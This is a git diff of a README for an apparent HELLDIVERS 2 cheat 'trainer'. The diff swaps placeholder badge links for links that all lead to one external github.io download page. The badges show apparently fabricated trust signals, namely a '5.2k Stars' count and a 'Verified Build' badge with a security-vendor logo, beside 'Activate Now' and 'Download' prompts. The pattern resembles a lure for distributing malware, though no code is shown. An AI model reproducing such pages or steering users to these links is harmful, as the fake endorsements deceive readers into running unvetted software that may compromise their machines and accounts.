@@ -22,10 +22,10 @@ This tool is updated frequently to stay compatible with the latest patches, keep
 * **XP & Medal Modifier** – Unlock upgrades faster for your Helldiver.
 * **Custom Hotkeys** – Bind cheats for quick tactical responses mid-battle.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://helldivers-2-trainer.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://helldivers-2-trainer.github.io/.github/)
+[![⭐ 5.2k Stars](https://img.shields.io/badge/⭐-5.2k%20Stars-yellow?style=for-the-badge\&logo=github)](https://helldivers-2-trainer.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-green?style=for-the-badge\&logo=github)](https://helldivers-2-trainer.github.io/.github/)
 
 ---
 
@@ -102,8 +102,8 @@ A: No tool is risk-free, but offline/squad-only play is recommended for maximum 
 
 The **HELLDIVERS 2 Trainer** puts tactical power at your fingertips. Whether you need infinite stratagems to crush bots or resource modifiers for farming medals, this software is built for both casual and elite Helldivers.
 
-[![Community](https://img.shields.io/badge/Community-purple?style=for-the-badge\&logo=github)](#)
-[![Verified Build](https://img.shields.io/badge/Verified-Build-orange?style=for-the-badge\&logo=checkmarx)](#)
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
+[![Community](https://img.shields.io/badge/Community-purple?style=for-the-badge\&logo=github)](https://helldivers-2-trainer.github.io/.github/)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-orange?style=for-the-badge\&logo=checkmarx)](https://helldivers-2-trainer.github.io/.github/)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://helldivers-2-trainer.github.io/.github/)
 
 ---
